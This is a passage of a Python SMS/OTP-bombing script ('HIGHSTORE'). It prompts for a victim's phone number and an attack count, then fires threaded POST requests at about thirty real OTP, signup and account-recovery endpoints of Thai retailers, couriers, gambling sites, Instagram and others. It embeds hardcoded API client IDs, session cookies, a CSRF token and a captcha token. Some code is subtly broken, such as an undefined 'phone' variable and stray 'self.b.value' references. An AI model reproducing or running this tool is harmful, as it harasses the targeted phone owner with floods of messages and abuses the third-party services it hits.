wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api21(target):
	global threads
	try:
		httpx.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api22(target):
	global threads
	try:
		httpx.post(f"https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})    
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api23(target):
	global threads
	try:
		httpx.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api24(target):
	global threads
	try:
		httpx.post(f"https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api25(target):
	global threads
	try:
		httpx.post(f"https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 

def api26(target):
	global threads
	try:
		httpx.post(f"https://api-sso.ch3plus.com/user/request-otp", json={"phone":f"{target}","type":"login"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 

def api27(target):
	global threads
	try:
		httpx.post(f"https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api28(target):
	global threads
	try:
		httpx.post(f"https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 

def api29(target):
	global threads
	try:
		httpx.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
		submit += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api30(target):
	global threads
	try:
		httpx.post(f"https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})                                                #-
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api31(target):
	global threads
	try:
		httpx.post(f"https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})                                                #-
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api32(target):
	global threads
	try:
		httpx.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api33(target):
	global threads
	try:
		httpx.post(f"https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api34(target):
	global threads
	try:
		httpx.post(f"https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": phone})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api35(target):
	global threads
	try:
		httpx.post(f"https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":66,"country_code":"TH"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api36(target):
	global threads
	try:
		httpx.post(f"https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api37(target):
	global threads
	try:
		httpx.post(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api38(target):
	global threads
	try:
		httpx.post(f"https://shop.foodland.co.th/login/generation", data={"phone": phone})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api39(target):
	global threads
	try:
		httpx.post(f"https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api40(target):
	global threads
	try:
		httpx.post(f"https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{target}"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api41(target):
	global threads
	try:
		httpx.post(f"https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api42(target):
	global threads
	try:
		httpx.post(f"https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api43(target):
	global threads
	try:
		httpx.post(f"https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api44(target):
	global threads
	try:
		httpx.post(f"https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api45(target):
	global threads
	try:
		httpx.post(f"https://www.msport1688.com/auth/send_otp", data={"phone":phone})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api46(target):
	global threads
	try:
		httpx.post(f"https://api.set.or.th/api/member/registration",json={"citizenId":"1840201297389","passport":"","country":"th","termFlag":"true","subscriptionFlag":"true","email":"bdjsss@gmail.com","password":"090Kkk12","gender":"M","firstName":"แวหยกกว","lastName":"กวยกจแวกวก","mobile":f"+66{phone}","captcha":"03AIIukzjHWhfsTpFpujjNmHQnFczifaX2EAd6iHyG_pqg769Dtpj4stj_E13Lg5Tj2LC5gEq0Es5EiMQa3E-Kl6h25rKm890hlxWQcwgOImpWS5BE-vCC0n_SiKPrHzfW-TLU2n1DLpJzVBooR1DZLt_DDtTxvZhap6YDR9m42kJBcIh3rTuhsYavsJ7daNTjzBqo9V7XuHuAjW_o7Bd1RXNhaLEFwJquoTkkjpvT2vjLVmzinm9Kgxr9GWpl-fuCr4GYRwXDydLBKjU-CwqrNk7elYhedS83VlIla_gtH6hF7HuLEvzU_FLt4V622MJIEPwZaAc6ivQjnibX_PwAS1evs67p7GH4CZn7JOE6VCSWDLC6wsz_um4bzygapb9_xjH6U_FhEz-6uIByc9VXlRtBoFHrLEDQhFlwHEqqG3wOS_HY2yPJReDuWgmbTVbdLXGSDf98tYZccz68n4u3g5McEYtIDo6afVObd-7LPcnK3uvi5CqIjoh3cvzyD4j9z5sLNS1yLibOnX6OGPTkG0trp-pjVOICPQ"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
	
def api47(target):
	global threads
	try:
		httpx.post(f"https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': self.b.value,'language': "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api48(target):
	global threads
	try:
		httpx.post(f"https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api49(target):
	global threads
	try:
		httpx.post(f"https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': self.b.value,'language': "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		
def api50(target):
	global threads
	try:
		httpx.post(f"https://icq.com/smscode/login/en", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass 
		

def main_page():
	global sent
	global nosent
	os.system("clear")
	print(bannerhighstore)
	print(Colorate.Horizontal(Colors.rainbow, "================================================================"))
	print()
	targetPhone = input("    \x1b[36m[\x1b[00m!\x1b[36m] \x1b[32mPHONE-NUMBER  \x1b[00m: \x1b[36m")
	try:
		targetAmount = int(input("    \x1b[36m[\x1b[00m!\x1b[36m] \x1b[32mNUMBER-ATTACK \x1b[00m: \x1b[36m"))
		print()
		print(Colorate.Horizontal(Colors.rainbow, "================================================================"))
		print()
		
		# print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
		
		for _ in range(targetAmount):
			threading.Thread(target=api1, args=[targetPhone]).start()
			threading.Thread(target=api2, args=[targetPhone]).start()
			threading.Thread(target=api3, args=[targetPhone]).start()
			threading.Thread(target=api4, args=[targetPhone]).start()
			threading.Thread(target=api5, args=[targetPhone]).start()
			threading.Thread(target=api6, args=[targetPhone]).start()
			threading.Thread(target=api7, args=[targetPhone]).start()
			threading.Thread(target=api8, args=[targetPhone]).start()
			threading.Thread(target=api9, args=[targetPhone]).start()
			threading.Thread(target=api10, args=[targetPhone]).start()
			threading.Thread(target=api11, args=[targetPhone]).start()
			threading.Thread(target=api12, args=[targetPhone]).start()
			threading.Thread(target=api13, args=[targetPhone]).start()
			threading.Thread(target=api14, args=[targetPhone]).start()
			threading.Thread(target=api15, args=[targetPhone]).start()
			threading.Thread(target=api16, args=[targetPhone]).start()
			threading.Thread(target=api17, args=[targetPhone]).start()
			threading.Thread(target=api18, args=[targetPhone]).start()
			threading.Thread(target=api19, args=[targetPhone]).start()
			threading.Thread(target=api20, args=[targetPhone]).start()
			threading.Thread(target=api21, args=[targetPhone]).start()
			threading.Thread(target=api22, args=[targetPhone]).start()
			threading.Thread(target=api23, args=[targetPhone]).start()
			threading.Thread(target=api24, args=[targetPhone]).start()
			threading.Thread(target=api25, args=[targetPhone]).start()
			threading.Thread(target=api26, args=[targetPhone]).start()
			threading.Thread(target=api27, args=[targetPhone]).start()
			threading.Thread(target=api28, args=[targetPhone]).start()
			threading.Thread(target=api29, args=[targetPhone]).start()
			threading.Thread(target=api30, args=[targetPhone]).start()
			threading.Thread(target=api31, args=[targetPhone]).start()
			threading.Thread(target=api32, args=[targetPhone]).start()
			threading.Thread(target=api33, args=[targetPhone]).start()
			threading.Thread(target=api34, args=[targetPhone]).start()
			threading.Thread(target=api35, args=[targetPhone]).start()
			threading.Thread(target=api36, args=[targetPhone]).start()
			threading.Thread(target=api37, args=[targetPhone]).start()
			threading.Thread(target=api38, args=[targetPhone]).start()
			threading.Thread(target=api39, args=[targetPhone]).start()
			threading.Thread(target=api40, args=[targetPhone]).start()
			threading.Thread(target=api41, args=[targetPhone]).start()
			threading.Thread(target=api42, args=[targetPhone]).start()
			threading.Thread(target=api43, args=[targetPhone]).start()
			threading.Thread(target=api44, args=[targetPhone]).start()
			threading.Thread(target=api45, args=[targetPhone]).start()
			threading.Thread(target=api46, args=[targetPhone]).start()
			threading.Thread(target=api47, args=[targetPhone]).start()
			threading.Thread(target=api48, args=[targetPhone]).start()
			threading.Thread(target=api49, args=[targetPhone]).start()
			threading.Thread(target=api50, args=[targetPhone]).start()
			
			
				
	except Exception as e:
		print(e)




main_page()